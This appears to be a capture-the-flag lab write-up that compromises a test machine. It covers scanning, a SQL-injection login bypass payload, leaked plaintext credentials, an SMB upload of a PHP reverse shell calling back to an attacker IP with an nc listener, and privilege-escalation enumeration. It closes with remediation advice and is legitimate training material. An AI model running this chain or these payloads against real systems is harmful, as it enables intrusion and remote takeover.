Phase 1: Initial Reconnaissance
Command:

bash
nmap -Pn -sC -sV -p- 10.65.157.131 -oN full_scan.txt
Results:

text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        Apache httpd 2.4.41
8082/tcp open  http        Node.js Express framework
Analysis: Found four key services - SSH, SMB, and two web servers on different ports.

Phase 2: Web Application Enumeration
Port 8080 Scan:

bash
gobuster dir -u http://10.65.157.131:8080 -w /usr/share/wordlists/dirb/common.txt
Found: /dev directory (403 Forbidden initially)

Port 8082 Scan:

bash
gobuster dir -u http://10.65.157.131:8082 -w /usr/share/wordlists/dirb/common.txt
Found: /login, /Login, /static

Analysis: Port 8082 running Node.js Express with login functionality - primary attack vector.

Phase 3: SQL Injection Exploitation
Target URL: http://10.65.157.131:8082/login

Payload Used:

text
Username: " or 1=1 or "
Password: anything
Credentials Obtained:

text
Tove : Jani
Godzilla : KONGistheKING  
SuperMan : snyderCut
ArthurMorgan : DeadEye
Impact: Complete authentication bypass and credential disclosure.

Phase 4: SMB Access and File Upload
SMB Share Discovery:

bash
smbclient -L \\10.65.157.131
Found: SECURED share with comment "Dev"

Successful Authentication:

bash
smbclient \\\\10.65.157.131\\SECURED -U ArthurMorgan
Password: DeadEye
Result: Successfully authenticated as ArthurMorgan

File Upload Test:

bash
echo "TEST UPLOAD FROM KALI" > test_upload.txt
smbclient \\\\10.65.157.131\\SECURED -U ArthurMorgan
put test_upload.txt
exit
Web Access Verification:

bash
curl http://10.65.157.131:8080/dev/test_upload.txt
Result: Successfully accessed uploaded file via web

Critical Finding: Files uploaded to SMB share are accessible through web server at /dev/ path.

Phase 5: Reverse Shell Deployment
PHP Reverse Shell Preparation:

bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
nano shell.php  # Modified IP to 10.65.90.195 and port to 4444
Upload Shell:

bash
smbclient \\\\10.65.157.131\\SECURED -U ArthurMorgan
put shell.php
exit
Listener Setup:

bash
nc -lvnp 4444
Shell Activation:

bash
curl http://10.65.157.131:8080/dev/shell.php
Shell Stabilization:

bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Result: Obtained stable reverse shell as www-data user.

Phase 6: User Flag Discovery
Search for user flag:

bash
find / -name user.txt 2>/dev/null
Found: /home/ArthurMorgan/user.txt

Retrieve user flag:

bash
cat /home/ArthurMorgan/user.txt
User Flag: ae39f419ce0a3a26f15db5aaa7e446ff

Phase 7: Privilege Escalation Path
Environment Analysis:

bash
env
Looking for: OPEN_PORT variable (not found in www-data environment)

Service Investigation:

bash
netstat -tuln | grep 4545
nc localhost 4545
Result: Port 4545 not actively listening

Alternative Privilege Escalation Methods Explored:

bash
# Check sudo rights
sudo -l
# Result: www-data not in sudoers

# Look for SUID files
find / -perm -4000 2>/dev/null
# No interesting SUID binaries found

# Check processes
ps aux | grep tmux
# Found multiple tmux processes running as marston

# Explore user directories
ls -la /home/
ls -la /home/marston/
# Found application files and scripts
Key Discovery: Multiple tmux sessions running as marston user - potential privilege escalation vector.

🔍 Key Vulnerabilities Identified
1. SQL Injection
Location: /login endpoint

Impact: Complete authentication bypass

Root Cause: Unsanitized user input in authentication query

2. SMB Misconfiguration
Issue: Excessive write permissions on SECURED share

Impact: Arbitrary file upload to web directory

Consequence: Remote code execution

3. Insecure File Handling
Problem: SMB uploads directly web-accessible

Location: /dev/ directory served by Apache

Risk: File upload leading to RCE

4. Privilege Escalation Paths
Method 1: Port 4545 service with Vim escape

Method 2: Tmux session hijacking

Users: www-data → marston → root

🛡️ Security Recommendations
Input Validation

Implement parameterized queries

Use prepared statements for database operations

Sanitize all user inputs

SMB Hardening

Restrict write permissions on shares

Implement access control lists

Regular permission audits

Web Security

Store uploaded files outside web root

Implement file type verification

Use secure file upload handlers

System Hardening

Regular session cleanup

Avoid running services with elevated privileges

Implement proper service isolation
